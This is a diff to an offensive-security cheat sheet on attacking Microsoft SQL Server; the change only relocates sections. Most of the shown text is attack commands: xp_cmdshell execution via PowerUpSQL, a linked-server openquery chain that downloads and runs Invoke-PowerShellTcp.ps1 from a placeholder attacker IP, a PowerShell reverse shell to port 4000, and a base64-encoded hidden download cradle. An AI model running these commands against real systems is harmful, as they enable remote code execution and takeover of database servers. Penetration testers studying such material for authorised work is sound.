@@ -1861,26 +1861,6 @@ Invoke-SqlServerDbElevateDbOwner -SqlUser <USER> -SqlPass <PASSWORD> -SqlServerI
 ### Command execution
 ![image](https://user-images.githubusercontent.com/43987245/151711534-6114738f-6c9c-49b2-8c5f-0cb27f5fa6d0.png)
 
-#### Execute commands
-```
-Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
-Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
- 
-Invoke-SQLOSCLR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
-Invoke-SQLOSOLe -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
-Invoke-SQLOSR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
-```
-
-#### Execute command through links example
-```
-select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
-```
-
-#### Execute reverse shell example
-```
-Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
-```
- 
 #### Check xp_cmdshell
 ```
 SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
@@ -1906,6 +1886,26 @@ EXEC master..xp_cmdshell 'whoami'
 $str = 'IEX ((new-object net.webclient).downloadstring("http://x.x.x.x:8080/payload"))'
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
 EXEC xp_cmdshell 'powershell.exe -w hidden -enc <BASE64 STRING>';
+```
+ 
+#### Execute commands examples
+```
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
+Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
+ 
+Invoke-SQLOSCLR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
+Invoke-SQLOSOLe -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
+Invoke-SQLOSR -Instance <SQL INSTANCE> -Verbose -Command "Whoami" 
+```
+
+#### Execute command through links example
+```
+select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
+```
+
+#### Execute reverse shell example
+```
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
  
 ### Database links
